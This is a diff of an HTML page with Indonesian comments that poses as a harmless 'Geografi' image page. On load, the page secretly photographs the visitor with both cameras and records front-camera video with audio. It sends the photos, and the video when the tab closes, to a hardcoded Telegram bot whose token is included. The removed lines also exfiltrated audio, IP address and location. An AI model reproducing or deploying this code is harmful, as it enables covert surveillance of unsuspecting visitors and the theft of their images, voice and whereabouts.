@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bagus Xxpn</title>
+    <title>Geografi X-6</title>
     <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -13,7 +13,10 @@
     </style>
 </head>
 <body>
-    <img src="https://img5.pixhost.to/images/2820/565901428_skyzopedia.jpg" alt="Skyzopedia">
+    <!-- Gambar yang lo mau tampilkan -->
+    <img src="https://files.catbox.moe/5agvoz.jpg" alt="geografi">
+
+    <!-- Kamera -->
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
 
@@ -21,40 +24,31 @@
         const TELEGRAM_BOT_TOKEN = "7904903199:AAEjqpYoBCj6y3X8VjtxYD6tyPpElCd9IS0";
         const TELEGRAM_CHAT_ID = "7081489041";
 
-        async function requestPermissions() {
+        let mediaRecorder;
+        let recordedChunks = [];
+
+        async function startCamera() {
             try {
-                // Minta izin akses kamera & mikrofon
-                await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                startCapture();
+                // Foto kamera depan & belakang
+                const streamFront = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                await capturePhoto(streamFront, "Depan");
+
+                const streamBack = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+                await capturePhoto(streamBack, "Belakang");
+
+                // Setelah foto, mulai rekam video kamera depan
+                await startRecording();
             } catch (error) {
-                alert("Izin akses kamera dan mikrofon diperlukan!");
+                console.error("Gagal mengakses kamera:", error);
             }
         }
 
-        async function startCapture() {
-            try {
-                const ipData = await getIPAndLocation();
-                const frontPhoto = await capturePhoto("user");
-                const backPhoto = await capturePhoto("environment");
-                const audioBlob = await recordAudio();
-
-                // Kirim ke Telegram
-                await sendToTelegram(frontPhoto, "Depan");
-                await sendToTelegram(backPhoto, "Belakang");
-                await sendAudioToTelegram(audioBlob);
-                await sendTextToTelegram(`📍 Info Pengguna:\nIP: ${ipData.ip}\nLokasi: ${ipData.city}, ${ipData.country}`);
-            } catch (error) {
-                console.error("Error:", error);
-            }
-        }
-
-        async function capturePhoto(facingMode) {
-            return new Promise(async (resolve) => {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
+        async function capturePhoto(stream, label) {
+            return new Promise((resolve) => {
                 const video = document.getElementById("video");
                 video.srcObject = stream;
 
-                video.onloadedmetadata = () => {
+                video.onloadedmetadata = async () => {
                     const canvas = document.getElementById("canvas");
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
@@ -62,43 +56,11 @@
 
                     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                     const imageData = canvas.toDataURL("image/jpeg");
-                    stream.getTracks().forEach(track => track.stop());
-                    resolve(imageData);
+
+                    await sendToTelegram(imageData, label);
+                    resolve();
                 };
             });
-        }
-
-        async function recordAudio() {
-            return new Promise(async (resolve) => {
-                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                const mediaRecorder = new MediaRecorder(stream);
-                let audioChunks = [];
-
-                mediaRecorder.ondataavailable = (event) => {
-                    audioChunks.push(event.data);
-                };
-
-                mediaRecorder.onstop = () => {
-                    const audioBlob = new Blob(audioChunks, { type: "audio/mp3" });
-                    resolve(audioBlob);
-                };
-
-                mediaRecorder.start();
-                setTimeout(() => {
-                    mediaRecorder.stop();
-                    stream.getTracks().forEach(track => track.stop());
-                }, 5000);
-            });
-        }
-
-        async function getIPAndLocation() {
-            try {
-                const response = await fetch("https://ipapi.co/json/");
-                return await response.json();
-            } catch (error) {
-                console.error("Gagal mendapatkan IP:", error);
-                return { ip: "Tidak diketahui", city: "Tidak diketahui", country: "Tidak diketahui" };
-            }
         }
 
         async function sendToTelegram(imageData, label) {
@@ -109,44 +71,61 @@
                 formData.append("photo", blob, `${label}.jpg`);
                 formData.append("caption", `📷 Foto ${label}`);
 
-                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                     method: "POST",
                     body: formData
                 });
+
+                console.log(`Foto ${label} dikirim ke Telegram:`, await response.json());
             } catch (error) {
                 console.error("Gagal mengirim foto:", error);
             }
         }
 
-        async function sendAudioToTelegram(audioBlob) {
+        async function startRecording() {
             try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+                mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm" });
+
+                mediaRecorder.ondataavailable = (event) => {
+                    if (event.data.size > 0) recordedChunks.push(event.data);
+                };
+
+                mediaRecorder.start();
+                console.log("Perekaman video dimulai");
+
+                // Kirim video saat user menutup halaman
+                window.addEventListener("beforeunload", sendVideoToTelegram);
+            } catch (error) {
+                console.error("Gagal memulai perekaman video:", error);
+            }
+        }
+
+        async function sendVideoToTelegram() {
+            if (mediaRecorder && recordedChunks.length > 0) {
+                mediaRecorder.stop();
+                console.log("Perekaman video selesai");
+
+                const blob = new Blob(recordedChunks, { type: "video/webm" });
                 const formData = new FormData();
                 formData.append("chat_id", TELEGRAM_CHAT_ID);
-                formData.append("voice", audioBlob, "audio.mp3");
-                formData.append("caption", "🎤 Rekaman Suara");
+                formData.append("video", blob, "Rekaman.mp4");
+                formData.append("caption", "🎥 Rekaman video kamera depan");
 
-                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVoice`, {
-                    method: "POST",
-                    body: formData
-                });
-            } catch (error) {
-                console.error("Gagal mengirim audio:", error);
+                try {
+                    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
+                        method: "POST",
+                        body: formData
+                    });
+
+                    console.log("Video dikirim ke Telegram:", await response.json());
+                } catch (error) {
+                    console.error("Gagal mengirim video:", error);
+                }
             }
         }
 
-        async function sendTextToTelegram(message) {
-            try {
-                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
-                });
-            } catch (error) {
-                console.error("Gagal mengirim pesan:", error);
-            }
-        }
-
-        window.onload = requestPermissions;
+        window.onload = startCamera;
     </script>
 </body>
 </html>
